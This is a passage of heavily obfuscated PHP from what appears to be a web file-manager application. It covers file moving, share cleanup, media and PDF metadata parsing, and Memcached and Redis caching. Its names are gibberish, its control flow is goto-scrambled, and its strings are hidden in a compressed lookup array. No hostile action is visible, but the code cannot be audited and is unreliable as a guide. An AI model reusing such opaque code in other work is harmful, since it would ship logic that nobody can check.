$FèéÛä¯Á->updateFileEnd($FŠ‹ººå…[$Aø‡‚“ ‹[38]], $FŠ‹ººå…[$Aø‡‚“ ‹[87]]); continue; } goto dæò à‰–•; bÉÊ¤É¶í: $d±åÏ¿ò…Ö = array($Aø‡‚“ ‹[752] => $FˆïÙÙÂ‘‡, $Aø‡‚“ ‹[85] => $b÷Ò¨ß‰); Model($Aø‡‚“ ‹[177])->where($a”âÍˆ)->save($d±åÏ¿ò…Ö); goto C¯‡ÇÏ¾Ä»; dæò à‰–•: if (IO::exist($b÷Ò¨ß‰)) { $FèéÛä¯Á->updateFileEnd($FŠ‹ººå…[$Aø‡‚“ ‹[38]], $FŠ‹ººå…[$Aø‡‚“ ‹[87]]); continue; } if (!IO::move($e‹†ËŞù÷, get_path_father($b÷Ò¨ß‰))) { $FÑºª¥İ‚‚ = !1; break; } $a”âÍˆ = array($Aø‡‚“ ‹[428] => $FŠ‹ººå…[$Aø‡‚“ ‹[428]]); goto bÉÊ¤É¶í; C¯‡ÇÏ¾Ä»: } $this->removeByFileID($däÁ‚¹òÈ‘); goto cŠÍ —ƒ; AäÍ±ÚÜÂë: $eÙ´çõ©àß = "\x7b\x69\x6f\x3a{$FˆïÙÙÂ‘‡}\x7d\57"; $FÑºª¥İ‚‚ = !0; $däÁ‚¹òÈ‘ = array(); goto c•‚Í½Çé; A¤Šº—´š: } public function progress($E½È Òµ†™) { return Task::get($_SERVER[çŞáÓæÚô‚Ô‡][2416] . $E½È Òµ†™); } private function removeByFileID($d‘“ÍÃ¤®¯ = array()) { goto CŸ”éê¹„; B©æŒÚí›: $a¤è…««â = Model($E‚¿‹Ê’’Ò[1124])->where($dá™”áñä)->field($E‚¿‹Ê’’Ò[378])->select(); if (!$a¤è…««â) { return; } $a¤è…««â = array_to_keyvalue($a¤è…««â, $E‚¿‹Ê’’Ò[43], $E‚¿‹Ê’’Ò[378]); goto E£ã˜ˆáŒ; E£ã˜ˆáŒ: foreach ($a¤è…««â as $bÄï¶ô˜™Î) { Model($E‚¿‹Ê’’Ò[391])->removeNow($bÄï¶ô˜™Î, !1); } goto c¬³öëõß¹; CŸ”éê¹„: $E‚¿‹Ê’’Ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($d‘“ÍÃ¤®¯)) { return; } $dá™”áñä = array($E‚¿‹Ê’’Ò[428] => array($E‚¿‹Ê’’Ò[17], $d‘“ÍÃ¤®¯)); goto B©æŒÚí›; c¬³öëõß¹: } private function removeShareItems($D½º‡ÙˆÙæ) { goto f´Ü…²Äéˆ; cŞ’š«ÉÃ: $DğŒíÜ§˜² = Model($DÖ©Ó¼Ó[2091])->where($C¼ŒóÊ¡›)->field($DÖ©Ó¼Ó[450])->select(); if (empty($DğŒíÜ§˜²)) { return; } $fåáé‚µ·á = array_to_keyvalue($DğŒíÜ§˜², $DÖ©Ó¼Ó[43], $DÖ©Ó¼Ó[450]); goto cŸ¨îË½é; cŸ¨îË½é: Model($DÖ©Ó¼Ó[547])->remove($fåáé‚µ·á); goto EôÄİ…‚ÉŞ; f´Ü…²Äéˆ: $DÖ©Ó¼Ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b¦Úİƒô— = "\x7b\x69\157\x3a{$D½º‡ÙˆÙæ}\175\x2f"; $C¼ŒóÊ¡› = array($DÖ©Ó¼Ó[378] => 0, $DÖ©Ó¼Ó[1026] => array($DÖ©Ó¼Ó[760], "{$b¦Úİƒô—}\x25")); goto cŞ’š«ÉÃ; EôÄİ…‚ÉŞ: } } goto F›º§İÇâİ; AÓëÈ¦·´‡: define($_SERVER[çŞáÓæÚô‚Ô‡][0], $_SERVER[çŞáÓæÚô‚Ô‡][1]); $_SERVER[·ü] = explode($_SERVER[çŞáÓæÚô‚Ô‡][2], gzinflate(substr($_SERVER[çŞáÓæÚô‚Ô‡][3], 10, -8))); function Model($D°Œ‚´Ÿ»ó = '', $Eˆ»ªÅ¦ì = '', $cÉ‡Š†Ö›ä = '') { goto cæ³¸¨ˆòË; cæ³¸¨ˆòË: $eå‡Üœ”‰¾ =& $_SERVER[·ü]; static $bêÛéù ˆ = array(); $CºÏô¯îóÇ = strtolower($Eˆ»ªÅ¦ì . $eå‡Üœ”‰¾[0] . $D°Œ‚´Ÿ»ó); goto eãŠÍ¸‹É; eãŠÍ¸‹É: if (isset($bêÛéù ˆ[$CºÏô¯îóÇ])) { return $bêÛéù ˆ[$CºÏô¯îóÇ]; } if ($D°Œ‚´Ÿ»ó) { $D°Œ‚´Ÿ»ó = strtoupper($D°Œ‚´Ÿ»ó[0]) . substr($D°Œ‚´Ÿ»ó, 1); $B«µªİÜÓŒ = $D°Œ‚´Ÿ»ó . $eå‡Üœ”‰¾[1]; if (class_exists($B«µªİÜÓŒ)) { $bêÛéù ˆ[$CºÏô¯îóÇ] = new $B«µªİÜÓŒ(); return $bêÛéù ˆ[$CºÏô¯îóÇ]; } } if (!$cÉ‡Š†Ö›ä) { $cÉ‡Š†Ö›ä = $GLOBALS[$eå‡Üœ”‰¾[2]][$eå‡Üœ”‰¾[3]]; } goto FŸ•¥Ë¼Å; FŸ•¥Ë¼Å: $bêÛéù ˆ[$CºÏô¯îóÇ] = new ModelBase($D°Œ‚´Ÿ»ó, $Eˆ»ªÅ¦ì, $cÉ‡Š†Ö›ä); return $bêÛéù ˆ[$CºÏô¯îóÇ]; goto fŸÁ¾ìËƒ; fŸÁ¾ìËƒ: } goto BÁ²’ÍœóŒ; d–„˜±à™¡: class GetInfo { private static $fileTypeArray; public static function get($F£îÑäƒñ¨) { $AÉó¢×¢Âñ = IO::info($F£îÑäƒñ¨); return self::infoAdd($AÉó¢×¢Âñ); } public static function check() { } public static function infoAdd(&$Bî‘Î¬ŞÚ) { goto fÚ”Ğ—Û×ô; fÚ”Ğ—Û×ô: $eõ¥ºç’à‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $e‘£ˆíËšó; if (!$e‘£ˆíËšó) { require SDK_DIR . $eõ¥ºç’à‘[1618]; $e‘£ˆíËšó = new getID3(); } goto D‡Ú’Á˜‰ß; dÔÎšœ¡¨: $DìÜöÊ–’ë = self::arrayValueLimit($DìÜöÊ–’ë); $DìÜöÊ–’ë[$eõ¥ºç’à‘[381]] = $aËÙÏ„¤Î; $Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[435]] = $DìÜöÊ–’ë; goto FÀ³ñÎ‡­í; FÀ³ñÎ‡­í: return $Bî‘Î¬ŞÚ; goto aØ£“—ñÛË; D‡Ú’Á˜‰ß: if (!$Bî‘Î¬ŞÚ || $Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[39]] != $eõ¥ºç’à‘[177]) { return; } if (!self::support($Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[170]]) || isset($Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[435]])) { return; } $eñ‘Š¹ÛÄ¤ = $eõ¥ºç’à‘[1619] . $Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[85]]; goto Cà¯°”¹”¨; Cà¯°”¹”¨: $aËÙÏ„¤Î = $Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[170]]; try { if ($Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[170]] == $eõ¥ºç’à‘[1620]) { $DìÜöÊ–’ë = self::psdParse($eñ‘Š¹ÛÄ¤); $aËÙÏ„¤Î = $eõ¥ºç’à‘[1621]; } else { if ($Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[170]] == $eõ¥ºç’à‘[1622]) { $DìÜöÊ–’ë = self::pdfParse($eñ‘Š¹ÛÄ¤); } else { $aËÙÏ„¤Î = self::$fileTypeArray[$eõ¥ºç’à‘[1623]][$Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[170]]]; $e§¤½ĞìòÎ = self::$fileTypeArray[$eõ¥ºç’à‘[1624]][$aËÙÏ„¤Î][$eõ¥ºç’à‘[1625]]; $a¤®ƒË×µ = @$e‘£ˆíËšó->analyze($eñ‘Š¹ÛÄ¤, $Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[87]], $Bî‘Î¬ŞÚ[$eõ¥ºç’à‘[38]]); $DìÜöÊ–’ë = self::parseData($a¤®ƒË×µ, $e§¤½ĞìòÎ, $Bî‘Î¬ŞÚ); } } } catch (Exception $F‘Ê ‚ê‹¦) { $DìÜöÊ–’ë = array($eõ¥ºç’à‘[381] => $aËÙÏ„¤Î); } if (!$DìÜöÊ–’ë) { return; } goto dÔÎšœ¡¨; aØ£“—ñÛË: } public static function support($CâãÃ¸éôÒ) { goto dç“—œõ’·; dç“—œõ’·: $FÔ…İ¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $CâãÃ¸éôÒ = strtolower($CâãÃ¸éôÒ); goto dê…›ø—ˆå; dê…›ø—ˆå: $FÜ©ïôÏÔº = array($FÔ…İ¾[1622], $FÔ…İ¾[1620]); if (in_array($CâãÃ¸éôÒ, $FÜ©ïôÏÔº)) { return !0; } if (isset(self::$fileTypeArray[$FÔ…İ¾[1623]][$CâãÃ¸éôÒ])) { return !0; } goto Eôõóøà’ƒ; Eôõóøà’ƒ: return !1; goto B¥¡ÚÒÌ»†; B¥¡ÚÒÌ»†: } public static function arrayValueLimit($dÎ­¢‰„¯Å, $C¶õœç³×Ø = 5000) { if (!is_array($dÎ­¢‰„¯Å)) { return $dÎ­¢‰„¯Å; } foreach ($dÎ­¢‰„¯Å as $fìèÜÏ‚ëÚ => $aĞé•¥¨–Ğ) { if (is_string($aĞé•¥¨–Ğ) && strlen($aĞé•¥¨–Ğ) > $C¶õœç³×Ø) { $dÎ­¢‰„¯Å[$fìèÜÏ‚ëÚ] = substr($aĞé•¥¨–Ğ, 0, $C¶õœç³×Ø); } else { if (is_array($aĞé•¥¨–Ğ)) { $dÎ­¢‰„¯Å[$fìèÜÏ‚ëÚ] = self::arrayValueLimit($aĞé•¥¨–Ğ, $C¶õœç³×Ø); } } } return $dÎ­¢‰„¯Å; } private static function parseData($FÂ‹ß³—Áî, $eÒƒ•ìˆ, $bÄ÷ïºç£à) { $eĞŒ†’îì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FèáÙÔÄ‹ = $FÂ‹ß³—Áî[$eĞŒ†’îì[1626]]; $eçˆºóÁô½ = array(); foreach ($eÒƒ•ìˆ as $e‡ºÁíµÕ¶ => $DÊË˜ÂÄÕæ) { foreach ($DÊË˜ÂÄÕæ as $b˜Îˆ¯À÷) { if (is_array($b˜Îˆ¯À÷)) { $bˆñî¦‡Ú‚ = self::parseData($FÂ‹ß³—Áî, $DÊË˜ÂÄÕæ, $bÄ÷ïºç£à); if ($bˆñî¦‡Ú‚) { $eçˆºóÁô½[$e‡ºÁíµÕ¶] = $bˆñî¦‡Ú‚; } break; } $DéÖˆ­óİÇ = str_replace($eĞŒ†’îì[1396], $FèáÙÔÄ‹, $b˜Îˆ¯À÷); $bˆñî¦‡Ú‚ = _get($FÂ‹ß³—Áî, $DéÖˆ­óİÇ); $bˆñî¦‡Ú‚ = is_array($bˆñî¦‡Ú‚) ? $bˆñî¦‡Ú‚[0] : $bˆñî¦‡Ú‚; if ($bˆñî¦‡Ú‚) { break; } } if ($bˆñî¦‡Ú‚ || $bˆñî¦‡Ú‚ === 0 || $bˆñî¦‡Ú‚ === !1) { $bˆñî¦‡Ú‚ = self::valueReset($b˜Îˆ¯À÷, $bˆñî¦‡Ú‚, $e‡ºÁíµÕ¶); if ($bˆñî¦‡Ú‚ !== null) { $eçˆºóÁô½[$e‡ºÁíµÕ¶] = $bˆñî¦‡Ú‚; } } } $eçˆºóÁô½ = self::valueResetAll($eçˆºóÁô½, $bÄ÷ïºç£à); return $eçˆºóÁô½; } private static function psdParse($eœøÉ‹‹ò) { $E—°­Êî‹ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (IO::fileSubstr($eœøÉ‹‹ò, 0, 4) != $E—°­Êî‹ù[1627]) { return !1; } $aĞ‚ùÍ« = getImageSize($eœøÉ‹‹ò, $e³ŸáœÈÏÛ); if (!$aĞ‚ùÍ«) { return; } $FÚ·èÅÄõí = array($E—°­Êî‹ù[1542] => $aĞ‚ùÍ«[0], $E—°­Êî‹ù[1544] => $aĞ‚ùÍ«[1]); return $FÚ·èÅÄõí; } private static function pdfParse($e…ªå ºìõ) { return FileParsePdf::parse($e…ªå ºìõ); } private static function fileTypeParse() { $fòÆÛõÂìÒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a‚ëò¹¨‚Ú = self::fileTypeArray(); $Fß×‹ÉŞà = array(); foreach ($a‚ëò¹¨‚Ú as $F¯®³¿àà => $c¦‹¹î”—Ò) { $Dí‰Êß‰¢ = _get($c¦‹¹î”—Ò, $fòÆÛõÂìÒ[170], $fòÆÛõÂìÒ[43]); $c¸ííÁ¹ = is_string($Dí‰Êß‰¢) ? explode($fòÆÛõÂìÒ[57], $Dí‰Êß‰¢) : $Dí‰Êß‰¢; if (!$c¸ííÁ¹) { continue; } foreach ($c¸ííÁ¹ as $Dí‰Êß‰¢) { $Dí‰Êß‰¢ = strtolower(trim($Dí‰Êß‰¢)); if (!$Dí‰Êß‰¢) { continue; } $Fß×‹ÉŞà[$Dí‰Êß‰¢] = $F¯®³¿àà; } $a‚ëò¹¨‚Ú[$F¯®³¿àà][$fòÆÛõÂìÒ[170]] = array_keys($Fß×‹ÉŞà); $a‚ëò¹¨‚Ú[$F¯®³¿àà][$fòÆÛõÂìÒ[1625]] = self::parseKeyMap($c¦‹¹î”—Ò[$fòÆÛõÂìÒ[1625]]); } return array($fòÆÛõÂìÒ[1624] => $a‚ëò¹¨‚Ú, $fòÆÛõÂìÒ[1623] => $Fß×‹ÉŞà); } private static function parseKeyMap($F©‹ ¬ŞÙ®) { $c˜‚í™—Š =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($F©‹ ¬ŞÙ® as $aŠŠÖ¨ƒ× => $eÄÉ¦Ò·ßù) { if (is_array($eÄÉ¦Ò·ßù)) { $a¯±•Ô©Ä = self::parseKeyMap($eÄÉ¦Ò·ßù); if ($a¯±•Ô©Ä) { $F©‹ ¬ŞÙ®[$aŠŠÖ¨ƒ×] = $a¯±•Ô©Ä; } continue; } $fññ¥¢’® = explode($c˜‚í™—Š[57], $eÄÉ¦Ò·ßù); $dŠ–­Õó½ù = array(); foreach ($fññ¥¢’® as $C°¿ãÏ„Á) { $C°¿ãÏ„Á = trim($C°¿ãÏ„Á); if (!$C°¿ãÏ„Á) { continue; } if (preg_match($c˜‚í™—Š[1628], $C°¿ãÏ„Á, $E™ˆ“¶ñ¨—)) { $cèë¾£æ¡ = explode($c˜‚í™—Š[280], $E™ˆ“¶ñ¨—[1]); foreach ($cèë¾£æ¡ as $f÷ñ½¿¯ÆÅ) { $dŠ–­Õó½ù[] = str_replace($E™ˆ“¶ñ¨—[0], $f÷ñ½¿¯ÆÅ, $C°¿ãÏ„Á); } } else { $dŠ–­Õó½ù[] = $C°¿ãÏ„Á; } } $F©‹ ¬ŞÙ®[$aŠŠÖ¨ƒ×] = $dŠ–­Õó½ù; } return $F©‹ ¬ŞÙ®; } private static function valueResetAll($c©¾£‚’¡™, $BÆªÌ…´‚) { goto fñ¸ãàêŠ; d±§ª›³¶‹: if ($dİĞÕ§è½š) { $bäéß‚°”ó = IO_PATH_SYSTEM_TEMP . $a™ËƒÕòñ÷[1634] . KodIO::hashPath($BÆªÌ…´‚) . $a™ËƒÕòñ÷[1635]; $c©¾£‚’¡™[$a™ËƒÕòñ÷[1636]] = Action($a™ËƒÕòñ÷[1637])->pluginCacheFileSet($bäéß‚°”ó, $dİĞÕ§è½š); unset($c©¾£‚’¡™[$a™ËƒÕòñ÷[1638]][$a™ËƒÕòñ÷[1621]]); } $b´œŞ˜£ËÊ = _get($c©¾£‚’¡™, $a™ËƒÕòñ÷[1639], $a™ËƒÕòñ÷[43]); $DÇ¥¦ÔÓ¿ = _get($c©¾£‚’¡™, $a™ËƒÕòñ÷[1640], $a™ËƒÕòñ÷[43]); goto aİ¢–•Ğ™º; aİ¢–•Ğ™º: $E¸ºƒÓÂè¾ = _get($c©¾£‚’¡™, $a™ËƒÕòñ÷[1641], $a™ËƒÕòñ÷[43]); $Bæˆ–®Ã = $b´œŞ˜£ËÊ . $DÇ¥¦ÔÓ¿ . $E¸ºƒÓÂè¾; if ($Bæˆ–®Ã && get_charset($Bæˆ–®Ã) != $a™ËƒÕòñ÷[335]) { $c©¾£‚’¡™[$a™ËƒÕòñ÷[1638]][$a™ËƒÕòñ÷[1349]] = iconv_to($c©¾£‚’¡™[$a™ËƒÕòñ÷[1638]][$a™ËƒÕòñ÷[1349]], get_charset($Bæˆ–®Ã), $a™ËƒÕòñ÷[335]); $c©¾£‚’¡™[$a™ËƒÕòñ÷[1638]][$a™ËƒÕòñ÷[1642]] = iconv_to($c©¾£‚’¡™[$a™ËƒÕòñ÷[1638]][$a™ËƒÕòñ÷[1642]], get_charset($Bæˆ–®Ã), $a™ËƒÕòñ÷[335]); $c©¾£‚’¡™[$a™ËƒÕòñ÷[1638]][$a™ËƒÕòñ÷[1643]] = iconv_to($c©¾£‚’¡™[$a™ËƒÕòñ÷[1638]][$a™ËƒÕòñ÷[1643]], get_charset($Bæˆ–®Ã), $a™ËƒÕòñ÷[335]); } goto DÌÇÊ«”; fñ¸ãàêŠ: $a™ËƒÕòñ÷ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($c©¾£‚’¡™[$a™ËƒÕòñ÷[1629]])) { $F¥éÕÚ³÷ = ceil($c©¾£‚’¡™[$a™ËƒÕòñ÷[1629]]); $bæäğæÎß = intval($F¥éÕÚ³÷ / 3600); $d“‡¢¶†‹š = intval(($F¥éÕÚ³÷ - $bæäğæÎß * 3600) / 60); $d¤ÀŸˆö» = $F¥éÕÚ³÷ % 60; $c©¾£‚’¡™[$a™ËƒÕòñ÷[1630]] = sprintf($a™ËƒÕòñ÷[1631], $bæäğæÎß, $d“‡¢¶†‹š, $d¤ÀŸˆö»); if ($bæäğæÎß == 0) { $c©¾£‚’¡™[$a™ËƒÕòñ÷[1630]] = sprintf($a™ËƒÕòñ÷[1632], $d“‡¢¶†‹š, $d¤ÀŸˆö»); } } $dİĞÕ§è½š = _get($c©¾£‚’¡™, $a™ËƒÕòñ÷[1633]); goto d±§ª›³¶‹; DÌÇÊ«”: return $c©¾£‚’¡™; goto cŠôî ô–; cŠôî ô–: } private static function valueReset($Aà…÷ßº´«, $E˜ªÔÜÖê, $F¾˜„äíª¹) { $EšØ‘õÔÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÃš¼´Ğ½Ä = $EšØ‘õÔÀ[1559]; switch ($Aà…÷ßº´«) { case $EšØ‘õÔÀ[1644]: $E˜ªÔÜÖê = $E˜ªÔÜÖê == $EšØ‘õÔÀ[93] ? $EšØ‘õÔÀ[1645] : $EšØ‘õÔÀ[1646]; break; case $EšØ‘õÔÀ[1647]: $E˜ªÔÜÖê = $E˜ªÔÜÖê ? $E˜ªÔÜÖê : null; break; default: break; } switch ($F¾˜„äíª¹) { case $EšØ‘õÔÀ[1648]: $E˜ªÔÜÖê = round($E˜ªÔÜÖê, 2); break; case $EšØ‘õÔÀ[197]: case $EšØ‘õÔÀ[117]: if ($E˜ªÔÜÖê < 0) { $E˜ªÔÜÖê = null; } else { if (is_numeric($E˜ªÔÜÖê)) { $E˜ªÔÜÖê = date($bÃš¼´Ğ½Ä, $E˜ªÔÜÖê); } } break; default: break; } return $E˜ªÔÜÖê; } private static function fileTypeArray() { $A®°á‚Ì˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($A®°á‚Ì˜[1621] => array($A®°á‚Ì˜[170] => $A®°á‚Ì˜[1649] . $A®°á‚Ì˜[1650], $A®°á‚Ì˜[1625] => array($A®°á‚Ì˜[1542] => $A®°á‚Ì˜[1651], $A®°á‚Ì˜[1544] => $A®°á‚Ì˜[1652], $A®°á‚Ì˜[1653] => $A®°á‚Ì˜[1654], $A®°á‚Ì˜[1655] => $A®°á‚Ì˜[1656], $A®°á‚Ì˜[197] => $A®°á‚Ì˜[1657], $A®°á‚Ì˜[117] => $A®°á‚Ì˜[1658], $A®°á‚Ì˜[1659] => $A®°á‚Ì˜[1660], $A®°á‚Ì˜[1661] => $A®°á‚Ì˜[1662], $A®°á‚Ì˜[1663] => $A®°á‚Ì˜[1664], $A®°á‚Ì˜[1665] => $A®°á‚Ì˜[1666], $A®°á‚Ì˜[1667] => $A®°á‚Ì˜[1668], $A®°á‚Ì˜[1669] => $A®°á‚Ì˜[1670], $A®°á‚Ì˜[1671] => $A®°á‚Ì˜[1672], $A®°á‚Ì˜[1673] => array($A®°á‚Ì˜[1674] => $A®°á‚Ì˜[1675], $A®°á‚Ì˜[1676] => $A®°á‚Ì˜[1677], $A®°á‚Ì˜[1678] => $A®°á‚Ì˜[1679]), $A®°á‚Ì˜[1680] => $A®°á‚Ì˜[1681], $A®°á‚Ì˜[1682] => $A®°á‚Ì˜[1683], $A®°á‚Ì˜[1684] => $A®°á‚Ì˜[1685], $A®°á‚Ì˜[1686] => $A®°á‚Ì˜[1687], $A®°á‚Ì˜[1688] => array($A®°á‚Ì˜[1689] => $A®°á‚Ì˜[1690], $A®°á‚Ì˜[1691] => $A®°á‚Ì˜[1692], $A®°á‚Ì˜[1693] => $A®°á‚Ì˜[1694], $A®°á‚Ì˜[1695] => $A®°á‚Ì˜[1696], $A®°á‚Ì˜[1697] => $A®°á‚Ì˜[1698], $A®°á‚Ì˜[1699] => $A®°á‚Ì˜[1700], $A®°á‚Ì˜[1701] => $A®°á‚Ì˜[1702], $A®°á‚Ì˜[1703] => $A®°á‚Ì˜[1704], $A®°á‚Ì˜[1705] => $A®°á‚Ì˜[1706], $A®°á‚Ì˜[1707] => $A®°á‚Ì˜[1708], $A®°á‚Ì˜[1709] => $A®°á‚Ì˜[1710]))), $A®°á‚Ì˜[1711] => array($A®°á‚Ì˜[170] => $A®°á‚Ì˜[1712] . $A®°á‚Ì˜[1713], $A®°á‚Ì˜[1625] => array($A®°á‚Ì˜[1629] => $A®°á‚Ì˜[1714], $A®°á‚Ì˜[197] => $A®°á‚Ì˜[1715], $A®°á‚Ì˜[117] => $A®°á‚Ì˜[1716], $A®°á‚Ì˜[1661] => $A®°á‚Ì˜[1717], $A®°á‚Ì˜[1718] => $A®°á‚Ì˜[1719], $A®°á‚Ì˜[1720] => $A®°á‚Ì˜[1647], $A®°á‚Ì˜[1721] => $A®°á‚Ì˜[1722], $A®°á‚Ì˜[1723] => $A®°á‚Ì˜[1724], $A®°á‚Ì˜[1725] => $A®°á‚Ì˜[1726], $A®°á‚Ì˜[1638] => array($A®°á‚Ì˜[1349] => $A®°á‚Ì˜[1727], $A®°á‚Ì˜[1642] => $A®°á‚Ì˜[1728], $A®°á‚Ì˜[1643] => $A®°á‚Ì˜[1729], $A®°á‚Ì˜[1730] => $A®°á‚Ì˜[1731], $A®°á‚Ì˜[1732] => $A®°á‚Ì˜[1733], $A®°á‚Ì˜[1734] => $A®°á‚Ì˜[1735], $A®°á‚Ì˜[1621] => $A®°á‚Ì˜[1736]))), $A®°á‚Ì˜[1737] => array($A®°á‚Ì˜[170] => $A®°á‚Ì˜[1738] . $A®°á‚Ì˜[1739], $A®°á‚Ì˜[1625] => array($A®°á‚Ì˜[1542] => $A®°á‚Ì˜[1740], $A®°á‚Ì˜[1544] => $A®°á‚Ì˜[1741], $A®°á‚Ì˜[1629] => $A®°á‚Ì˜[1714], $A®°á‚Ì˜[197] => $A®°á‚Ì˜[1742], $A®°á‚Ì˜[117] => $A®°á‚Ì˜[1743], $A®°á‚Ì˜[1648] => $A®°á‚Ì˜[1744], $A®°á‚Ì˜[1725] => $A®°á‚Ì˜[1745], $A®°á‚Ì˜[1721] => $A®°á‚Ì˜[1746], $A®°á‚Ì˜[1661] => $A®°á‚Ì˜[1747], $A®°á‚Ì˜[1711] => array($A®°á‚Ì˜[1720] => $A®°á‚Ì˜[1647], $A®°á‚Ì˜[1748] => $A®°á‚Ì˜[1749], $A®°á‚Ì˜[1718] => $A®°á‚Ì˜[1719], $A®°á‚Ì˜[1725] => $A®°á‚Ì˜[1726], $A®°á‚Ì˜[1721] => $A®°á‚Ì˜[1750], $A®°á‚Ì˜[1723] => $A®°á‚Ì˜[1724]))), $A®°á‚Ì˜[1751] => array($A®°á‚Ì˜[1625] => array($A®°á‚Ì˜[1752] => $A®°á‚Ì˜[1753], $A®°á‚Ì˜[1754] => $A®°á‚Ì˜[1755])), $A®°á‚Ì˜[1756] => array($A®°á‚Ì˜[1625] => array())); } } function exif_read_data_io($dê£¬éîêÄ, $d‡À†˜©¬Ä = null, $e°ÏÙæòƒŒ = false, $a³³±ÚÚÃ° = false) { $a©ĞÎùŒö­ = StreamWrapperIO::read($dê£¬éîêÄ, 0, 1024 * 64); $Bè·×Ã Ú¶ = $_SERVER[çŞáÓæÚô‚Ô‡][1757] . base64_encode($a©ĞÎùŒö­); return exif_read_data($Bè·×Ã Ú¶, $d‡À†˜©¬Ä, $e°ÏÙæòƒŒ, $a³³±ÚÚÃ°); } function getimagesize_io($EœàÙ¥È‘¾, &$dˆ‘ÛõíÆå = false) { $C ¾ñõ·÷ƒ = StreamWrapperIO::read($EœàÙ¥È‘¾, 0, 1024 * 64); $EœàÙ¥È‘¾ = $_SERVER[çŞáÓæÚô‚Ô‡][1757] . base64_encode($C ¾ñõ·÷ƒ); return getimagesize($EœàÙ¥È‘¾, $dˆ‘ÛõíÆå); } goto Eä¬ŒÁ”; D³òå¨Ó­Í: $_SERVER[éÑÍñÜ£™] = explode($_SERVER[çŞáÓæÚô‚Ô‡][559], gzinflate(substr($_SERVER[çŞáÓæÚô‚Ô‡][560], 10, -8))); $c¯Ş«Œ»„” = $_SERVER[çŞáÓæÚô‚Ô‡][561]; if (strlen($c¯Ş«Œ»„”) < $_SERVER[çŞáÓæÚô‚Ô‡][562]) { return; } goto eÒÙƒä¯È; e¶»ÅØî½Ì: class CacheLockDatabase { public function lock($Cº‡˜°—ø, $C«®ôáœ• = 0) { $E›Ç¯¯Òš‡ = Model($_SERVER[çŞáÓæÚô‚Ô‡][765]); $BŸ£¡¶–»ø = microtime(!0) + $C«®ôáœ•; while (microtime(!0) < $BŸ£¡¶–»ø) { $d“õË•Å† = $E›Ç¯¯Òš‡->get($Cº‡˜°—ø); if (!$d“õË•Å† || $d“õË•Å† < microtime(!0)) { $Aˆ¬ÕøÛ±È = $E›Ç¯¯Òš‡->set($Cº‡˜°—ø, $BŸ£¡¶–»ø); if ($Aˆ¬ÕøÛ±È) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C¸§¥«íÂ) { return Model($_SERVER[çŞáÓæÚô‚Ô‡][765])->get($C¸§¥«íÂ); } public function unlock($eÊÚÂˆ®Ö˜) { Model($_SERVER[çŞáÓæÚô‚Ô‡][765])->remove($eÊÚÂˆ®Ö˜); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Aì¯‚Ï÷Ë, $b®Ì»ÇÖœ) { $d¥­‡’¬µ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!class_exists($d¥­‡’¬µ[786])) { show_json($d¥­‡’¬µ[787], !1); } $this->cacheTime = $b®Ì»ÇÖœ; $this->handle = new Memcached(); if (is_array($Aì¯‚Ï÷Ë[$d¥­‡’¬µ[788]]) && count($Aì¯‚Ï÷Ë[$d¥­‡’¬µ[788]]) >= 1) { foreach ($Aì¯‚Ï÷Ë[$d¥­‡’¬µ[788]] as $eÛØ¨®ÊŸÚ) { $B¨æŸš± = explode($d¥­‡’¬µ[4], $eÛØ¨®ÊŸÚ); $this->handle->addServer($B¨æŸš±[0], $B¨æŸš±[1]); } } else { $this->handle->addServer($Aì¯‚Ï÷Ë[$d¥­‡’¬µ[179]], $Aì¯‚Ï÷Ë[$d¥­‡’¬µ[180]]); } } public function set($cÔïˆ—°á, $B¨öÊ¸ôù›, $Fš™Ú¸¥¢¯ = false) { $Fš™Ú¸¥¢¯ = $Fš™Ú¸¥¢¯ ? $Fš™Ú¸¥¢¯ : $this->cacheTime; return $this->handle->set($cÔïˆ—°á, $B¨öÊ¸ôù›, $Fš™Ú¸¥¢¯); } public function get($F±ˆ«Àø÷) { return $this->handle->get($F±ˆ«Àø÷); } public function remove($F¨íÊ¿†‡†) { return $this->handle->delete($F¨íÊ¿†‡†); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($c‡¸¸‹‚í¸, $Dù‰ßÏßáâ) { $dÂØµò× =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!class_exists($dÂØµò×[789])) { show_json($dÂØµò×[790], !1); } $this->cacheTime = $Dù‰ßÏßáâ; $d¥‰¼ ää¥ = isset($c‡¸¸‹‚í¸[$dÂØµò×[791]]) ? $c‡¸¸‹‚í¸[$dÂØµò×[791]] : 10; $dß·î¶ÏßÓ = _get($c‡¸¸‹‚í¸, $dÂØµò×[788]); if ($dß·î¶ÏßÓ && is_array($dß·î¶ÏßÓ)) { $this->initCluster($c‡¸¸‹‚í¸, $d¥‰¼ ää¥); } else { $this->handle = $this->init($c‡¸¸‹‚í¸, $d¥‰¼ ää¥); } } private function init($B‚«°ù‹Ñ¤, $c±Ù°³Íõ) { $D‘á±ÛôœÃ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A§¯´ÂôÉ = new Redis(); $C¾áé•Ÿè = isset($B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[792]]) ? $B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[792]] : !1; if 